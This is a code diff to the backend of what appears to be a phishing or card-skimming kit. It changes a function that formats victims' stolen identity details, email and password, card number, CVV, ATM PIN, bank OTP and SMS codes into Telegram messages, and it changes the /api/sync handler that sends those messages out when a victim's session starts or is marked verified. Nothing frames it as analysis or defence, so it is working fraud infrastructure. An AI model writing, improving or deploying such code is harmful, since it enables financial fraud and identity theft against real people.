@@ -154,12 +154,21 @@ const escapeHtml = (unsafe: any) => {
         .replace(/'/g, "&#039;");
 };
 
-const formatSessionForTelegram = (session: any, title: string, flag: string) => {
+const formatSessionForTelegram = (session: any, title: string, flag: string, hideEmpty: boolean = false) => {
     const s = session;
     const d = s.data || s; // Fallback
 
     // Helper for "Value or Empty"
-    const v = (val: any) => val ? `<code>${escapeHtml(val)}</code>` : '<i>(Empty)</i>';
+    const v = (val: any) => {
+        if (val) return `<code>${escapeHtml(val)}</code>`;
+        return hideEmpty ? null : '<i>(Empty)</i>';
+    };
+
+    // Helper to add line only if value exists or we are showing empty
+    const addLine = (label: string, val: any, prefix = '├') => {
+        const formatted = v(val);
+        return formatted ? `${prefix} <b>${label}:</b> ${formatted}\n` : '';
+    };
 
     let msg = `${flag} <b>${title}</b>\n\n`;
 
@@ -169,34 +178,51 @@ const formatSessionForTelegram = (session: any, title: string, flag: string) => 
 
     // Identity
     if (d.firstName || d.lastName || d.email) {
-        msg += `\n👤 <b>IDENTITY PROFILE</b>\n`;
-        msg += `├ <b>Name:</b> ${v((d.firstName + ' ' + d.lastName).trim())}\n`;
-        msg += `├ <b>DOB:</b> ${v(d.dob)}\n`;
-        msg += `├ <b>Phone:</b> ${v(d.phoneNumber)}\n`;
-        msg += `├ <b>Addr:</b> ${v(d.address)}\n`;
-        msg += `└ <b>Loc:</b> ${v(d.country)}\n`;
+        let section = `\n👤 <b>IDENTITY PROFILE</b>\n`;
+        let content = '';
+        content += addLine('Name', (d.firstName + ' ' + d.lastName).trim());
+        content += addLine('DOB', d.dob);
+        content += addLine('Phone', d.phoneNumber);
+        content += addLine('Addr', d.address);
+        content += addLine('Loc', d.country, '└');
+
+        if (content || !hideEmpty) msg += section + content;
     }
 
     // Credentials
     if (d.email || d.password) {
-        msg += `\n🔐 <b>CREDENTIALS</b>\n`;
-        msg += `├ <b>Email:</b> ${v(d.email)}\n`;
-        msg += `└ <b>Pass:</b> ${v(d.password)}\n`;
+        let section = `\n🔐 <b>CREDENTIALS</b>\n`;
+        let content = '';
+        content += addLine('Email', d.email);
+        content += addLine('Pass', d.password, '└');
+
+        if (content || !hideEmpty) msg += section + content;
     }
 
     // Financial
     if (d.cardNumber) {
-        msg += `\n💳 <b>FINANCIAL</b>\n`;
-        msg += `├ <b>Type:</b> ${v(d.cardType)}\n`;
-        msg += `├ <b>Card:</b> ${v(d.cardNumber)}\n`;
-        msg += `├ <b>Exp:</b> ${v(d.cardExpiry)} • <b>CVV:</b> ${v(d.cardCvv)}\n`;
-        msg += `├ <b>ATM PIN:</b> ${v(d.atmPin)}\n`;
-        msg += `└ <b>Bank OTP:</b> ${v(d.cardOtp)}\n`;
+        let section = `\n💳 <b>FINANCIAL</b>\n`;
+        let content = '';
+        content += addLine('Type', d.cardType);
+        content += addLine('Card', d.cardNumber);
+
+        // Multi-value line logic
+        const exp = v(d.cardExpiry);
+        const cvv = v(d.cardCvv);
+        if (exp || cvv || !hideEmpty) {
+             content += `├ <b>Exp:</b> ${exp || '<i>(Empty)</i>'} • <b>CVV:</b> ${cvv || '<i>(Empty)</i>'}\n`;
+        }
+
+        content += addLine('ATM PIN', d.atmPin);
+        content += addLine('Bank OTP', d.cardOtp, '└');
+
+        if (content || !hideEmpty) msg += section + content;
     }
 
     if (d.phoneCode) {
-        msg += `\n📱 <b>SMS VERIFICATION</b>\n`;
-        msg += `└ <b>Code:</b> ${v(d.phoneCode)}\n`;
+        let section = `\n📱 <b>SMS VERIFICATION</b>\n`;
+        let content = addLine('Code', d.phoneCode, '└');
+        if (content || !hideEmpty) msg += section + content;
     }
 
     // Fingerprint
@@ -339,7 +365,8 @@ app.post('/api/sync', async (req, res) => {
             const alreadyHadCreds = e && hasCreds(e);
 
             if (!alreadyHadCreds) {
-                 const msg = formatSessionForTelegram(data, 'New Session Initialized', flag);
+                 // Hide empty fields for new session init
+                 const msg = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
                  sendTelegram(msg);
             }
         }
@@ -348,8 +375,16 @@ app.post('/api/sync', async (req, res) => {
         // Trigger: Status changes to Verified
         if (existing && existing.status !== 'Verified' && data.status === 'Verified') {
              const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
-             const title = `Session Verified ${cardType}`;
-             const msg = formatSessionForTelegram(data, title, flag);
+             let title = `Session Verified ${cardType}`;
+             let hideEmpty = false;
+
+             // Check if this is an Archived (Incomplete) session
+             if (data.isArchivedIncomplete) {
+                 title = `Session Incomplete (Archived) ${cardType}`;
+                 hideEmpty = true;
+             }
+
+             const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
              sendTelegram(msg);
         }
 
